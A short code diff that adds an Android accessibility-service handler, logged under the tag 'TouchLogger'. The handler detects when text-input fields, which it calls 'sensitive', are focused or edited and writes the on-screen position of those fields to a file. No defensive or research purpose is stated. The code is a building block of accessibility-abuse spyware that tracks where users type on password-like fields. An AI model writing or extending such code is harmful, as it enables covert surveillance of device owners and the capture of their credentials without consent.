@@ -1,0 +1,39 @@
+@Override
+public void onAccessibilityEvent(AccessibilityEvent event) {
+    try {
+        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source == null) return;
+
+            CharSequence className = source.getClassName();
+            if (className != null && className.toString().contains("EditText")) {
+                isSensitiveFieldActive = true;
+                Log.d("TouchLogger", "Sensitive input field focused.");
+            } else {
+                isSensitiveFieldActive = false;
+            }
+        }
+
+        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source == null) return;
+
+            CharSequence className = source.getClassName();
+            if (className != null && className.toString().contains("EditText")) {
+                isSensitiveFieldActive = true;
+            }
+        }
+
+        if (event.getSource() != null && isSensitiveFieldActive) {
+            Rect bounds = new Rect();
+            event.getSource().getBoundsInScreen(bounds);
+
+            int x = bounds.centerX();
+            int y = bounds.centerY();
+            logTouchToFile(x, y);
+        }
+
+    } catch (Exception e) {
+        Log.e("TouchLogger", "Error in enhanced logging: " + e.getMessage());
+    }
+}
